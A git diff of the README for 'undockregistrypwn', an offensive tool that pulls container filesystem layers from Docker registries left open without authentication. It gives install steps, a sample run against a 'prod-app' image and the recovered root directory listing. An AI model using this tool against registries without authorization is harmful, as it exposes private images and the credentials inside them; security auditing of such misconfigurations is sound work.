@@ -1,8 +1,27 @@
-# dockrdumpr
-Docker filesystem extractor via BLOB files through Unauthenticated Docker Registry.
+# undockregistrypwn
+
+Unauthenticated Docker Registry filesystem (BLOB files) dumper tool.
+
+### Requirements
+
+- `jq`
+- `curl`
+- `git`
+
+### Installation
 
 ```
-root@lab:~# bash dockrdumpr.sh http://privdocker.reg:5000
+sudo apt install jq curl git -y
+```
+
+```
+git clone https://github.com/xchopath/undockregistrypwn
+```
+
+### How to use
+
+```
+root@lab:~# bash undockregistrypwn.sh http://privdocker.reg:5000
  -------------------
  | UNAUTHENTICATED |
  | DOCKER REGISTRY |
@@ -11,7 +30,7 @@ root@lab:~# bash dockrdumpr.sh http://privdocker.reg:5000
 
  OK: DOCKER_REG_URL: http://privdocker.reg:5000
 
- * Dump started: prod-app
+ * Dump starting: prod-app
  --- BLOB: sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
  --- BLOB: sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
  --- BLOB: sha256:7930823325656499d9b027860e1befe1489f55455e0449ddc2422ad71682d126
@@ -19,7 +38,9 @@ root@lab:~# bash dockrdumpr.sh http://privdocker.reg:5000
  --- BLOB: sha256:ad7d06de431290c64a44d34c5f35d2c580debf205a6fc017a07aa6ea8bba7788
  --- BLOB: sha256:0d4c7a46cc5e5c1ffd6b03cf599e8b5ee3794dbdc05e4a97c51338a3c2d5a48f
  ```
- 
+
+### Result
+
 ```
 root@lab:~# cd prod-app/
 root@lab:~/prod-app# ls -ltrah
@@ -46,7 +67,3 @@ drwx------  5 root root 4.0K Jun  9 12:11 root
 drwxr-xr-x 10 root root 4.0K Jun 22 16:35 ..
 drwxr-xr-x 21 root root 4.0K Jun 22 19:00 .
 ```
-
-# Requirements
-- jq
-- curl
